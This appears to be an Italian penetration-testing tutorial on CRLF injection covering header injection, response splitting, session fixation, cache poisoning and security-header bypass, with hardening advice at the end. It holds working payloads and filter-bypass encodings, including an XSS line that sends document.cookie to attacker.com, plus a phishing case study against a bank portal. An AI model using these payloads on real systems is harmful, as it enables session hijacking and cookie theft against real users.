---
title: 'CRLF Injection: Header Injection, XSS e Cache Poisoning'
slug: crlf-injection
description: 'Scopri come sfruttare una CRLF injection nel pentesting web: header injection, HTTP response splitting, session fixation e cache poisoning.'
image: /crlf-injection.webp
draft: true
date: 2026-03-14T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - cache poisoning
---

Il protocollo HTTP è basato sul testo. Ogni header è separato dal successivo da due caratteri invisibili: **CR** (Carriage Return, `\r`, `%0d`) e **LF** (Line Feed, `\n`, `%0a`). Due header consecutivi e una riga vuota (`\r\n\r\n`) separano gli header dal body. Questa struttura semplice è anche la sua debolezza: se un attaccante riesce a iniettare `\r\n` in un valore che finisce in un header HTTP, può **creare nuovi header** o addirittura **iniettare un body HTML completo** nella risposta.

La **CRLF Injection** sembra una vulnerabilità minore — "aggiungi un header, e allora?" — ma le conseguenze sono serie: **session fixation** (imponi un cookie di sessione all'utente), **cache poisoning** (avveleni la CDN con contenuto malevolo servito a tutti), **XSS** (inietti JavaScript nel body via response splitting), e **bypass di security header** (disabilita Content-Security-Policy o X-Frame-Options).

La trovo nel **10% dei pentest web**, quasi sempre nei redirect: l'applicazione prende un URL dall'utente e lo mette nell'header `Location:` senza rimuovere i caratteri CRLF.

Satellite operativo della [guida pillar Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa).

## Cos'è la CRLF Injection?

La CRLF Injection è una vulnerabilità in cui l'attaccante inietta i caratteri **CR (`\r`, `%0d`) e LF (`\n`, `%0a`)** all'interno di un valore che viene inserito negli header HTTP di risposta. Poiché gli header HTTP sono delimitati dalla sequenza CRLF, l'iniezione di questi caratteri permette di aggiungere header arbitrari alla risposta o, con una doppia sequenza CRLF (`\r\n\r\n`), di iniettare un body HTML completo (HTTP Response Splitting).

> **La CRLF Injection è pericolosa?**
> Sì — porta a **session fixation** (controllo della sessione dell'utente), **cache poisoning** (contenuto malevolo servito dalla CDN a tutti gli utenti), **XSS** (JavaScript iniettato nella risposta), e **bypass di security header**. L'impatto varia da account takeover a compromissione su larga scala via cache. Trovata nel **10% dei pentest web**.

## Come Verificare se Sei Vulnerabile

```bash
# Test manuale sul parametro di redirect
curl -v "https://target.com/redirect?url=http://legit.com%0d%0aInjected-Header:true"
# Se la risposta contiene "Injected-Header: true" → CRLF confermata

# CRLFuzz — tool dedicato
crlfuzz -u "https://target.com/redirect?url=test" -s

# Nuclei
nuclei -u https://target.com -tags crlf
```

## Come Funziona — Passo per Passo

### Scenario tipico: redirect

```python
# ❌ VULNERABILE
@app.route('/redirect')
def redirect_page():
    url = request.args.get('url')
    response = make_response('', 302)
    response.headers['Location'] = url  # Input utente nell'header!
    return response
```

**Request normale:**

```
GET /redirect?url=http://example.com HTTP/1.1
```

**Risposta:**

```
HTTP/1.1 302 Found
Location: http://example.com
```

**Request con CRLF Injection:**

```
GET /redirect?url=http://example.com%0d%0aSet-Cookie:session=EVIL HTTP/1.1
```

**Risposta:**

```
HTTP/1.1 302 Found
Location: http://example.com
Set-Cookie: session=EVIL     ← HEADER INIETTATO!
```

L'attaccante ha aggiunto un header `Set-Cookie` arbitrario alla risposta.

## Exploitation — Cosa Puoi Fare Con la CRLF

### 1. Session Fixation

```
/redirect?url=http://legit.com%0d%0aSet-Cookie:session=ATTACKER_SESSION_ID;Path=/;HttpOnly
```

L'utente riceve un cookie di sessione controllato dall'attaccante. Quando l'utente fa login, la sessione `ATTACKER_SESSION_ID` viene autenticata — e l'attaccante la conosce.

### 2. XSS via HTTP Response Splitting

```
/redirect?url=test%0d%0a%0d%0a<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

La doppia CRLF (`%0d%0a%0d%0a`) termina gli header e inizia il body. Il JavaScript iniettato viene eseguito nel browser dell'utente.

### 3. Cache Poisoning

Se c'è un CDN/reverse proxy che cachea le risposte:

```
GET /redirect?url=test%0d%0aX-Forwarded-Host:attacker.com%0d%0a%0d%0a<html>Malicious content</html> HTTP/1.1
Host: target.com
```

La CDN cachea la risposta con il contenuto malevolo. **Ogni utente** che visita quell'URL riceve il contenuto dell'attaccante — senza dover interagire direttamente con il link malevolo.

### 4. Bypass Security Header

```
/redirect?url=test%0d%0aContent-Security-Policy:default-src *%0d%0aX-Frame-Options:ALLOWALL
```

Sovrascrive le policy di sicurezza, permettendo XSS o clickjacking che altrimenti sarebbero bloccati.

## Bypass dei Filtri

### Encoding variations

```bash
%0d%0a                    # URL-encoded CRLF
%0D%0A                    # Uppercase
%E5%98%8A%E5%98%8D        # UTF-8 overlong encoding di CRLF
\r\n                      # Backslash notation
%0d                       # Solo CR (alcuni server accettano solo CR)
%0a                       # Solo LF (molti server accettano solo LF)
%0d%20%0a                 # CR + space + LF
```

### Double encoding

```bash
%250d%250a                # Il server decodifica due volte
%%0d0d%%0a0a              # Nested encoding
```

### Unicode tricks

```bash
%c0%8d%c0%8a              # Overlong UTF-8
%e5%98%8a%e5%98%8d        # Unicode CRLF equivalents
```

## 🏢 Enterprise Escalation

```
CRLF su redirect → Session Fixation → Account Takeover utente admin
→ Admin panel → API key → servizi interni → lateral movement

CRLF su CDN → Cache Poisoning → JavaScript malevolo servito a tutti
→ credential harvesting massivo → account di massa compromessi
```

**La cache poisoning è l'impatto più devastante:** un singolo injection avvelena la cache per tutti gli utenti.

## Micro Playbook Reale

**Minuto 0-2 →** Trova i redirect: `/redirect?url=`, `/login?next=`, `/goto?link=`
**Minuto 2-5 →** Testa: `%0d%0aInjected:true` nell'URL del redirect
**Minuto 5-10 →** Se confermata: session fixation (`Set-Cookie`) o XSS (response splitting)
**Minuto 10-15 →** Se c'è CDN: testa cache poisoning

## Caso Studio Concreto

**Settore:** Portale bancario, 50.000 utenti, CDN Akamai.
**Scope:** Pentest applicativo.

L'endpoint `/auth/sso?returnUrl=` inseriva il parametro nell'header `Location:` del redirect dopo il login SSO. `returnUrl=http://bank.com%0d%0aSet-Cookie:JSESSIONID=ATTACKER123;Path=/;Secure` → il browser dell'utente riceveva il cookie di sessione impostato dall'attaccante.

Ho inviato un link di phishing a un account di test: `https://bank.com/auth/sso?returnUrl=http://bank.com%0d%0aSet-Cookie:JSESSIONID=KNOWN_VALUE;Path=/`. Dopo il login dell'utente, la sessione `KNOWN_VALUE` era autenticata — session fixation riuscita. Con la sessione dell'admin, accesso a tutte le funzionalità di gestione.

**Tempo: 15 minuti dall'injection all'account takeover.**

## Errori Comuni Reali

**1. Redirect con URL dall'utente senza sanitizzazione (90% dei casi)**
`Location: {user_url}` — il vettore classico.

**2. Header custom con input utente**
`X-Request-ID: {user_input}`, `X-Correlation-ID: {user_input}` → CRLF injection se i caratteri non sono filtrati.

**3. Log-to-response pattern**
Applicazioni che restituiscono log entry nell'header della risposta (debug mode).

**4. Filtro solo su LF, non su CR (o viceversa)**
Alcuni server accettano solo `%0d` o solo `%0a` per terminare un header.

## Indicatori di Compromissione (IoC)

* `%0d%0a` o `%0D%0A` nei parametri URL nei log web
* Header HTTP duplicati o inaspettati nelle risposte (Set-Cookie non generati dall'app)
* Cache CDN con contenuto anomalo (HTML/JavaScript non dell'applicazione)
* Session ID identici per utenti diversi (session fixation in corso)

## Mini Chain Offensiva Reale

```
CRLF Injection (SSO redirect) → Session Fixation → Phishing Link → Admin Session → Account Takeover → Dati 50K utenti
```

## Detection & Hardening

* **Rimuovi `\r` e `\n`** da qualsiasi input inserito in header HTTP
* **Usa le funzioni di redirect del framework** (Flask `redirect()`, Express `res.redirect()`) che sanitizzano automaticamente
* **URL whitelist** — valida l'URL di destinazione contro un elenco di URL permessi
* **Security header** — Content-Security-Policy, X-Content-Type-Options, X-Frame-Options
* **CDN configuration** — cache key include i parametri rilevanti, purge automatico su anomalie

***

Satellite della [Guida Completa Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa). Vedi anche: [HTTP Header Injection](https://hackita.it/articoli/http-header-injection), [Log Injection](https://hackita.it/articoli/log-injection).

> I tuoi redirect sanitizzano i caratteri CRLF? [Penetration test HackIta](https://hackita.it/servizi). Per padroneggiare le injection HTTP: [formazione 1:1](https://hackita.it/formazione).
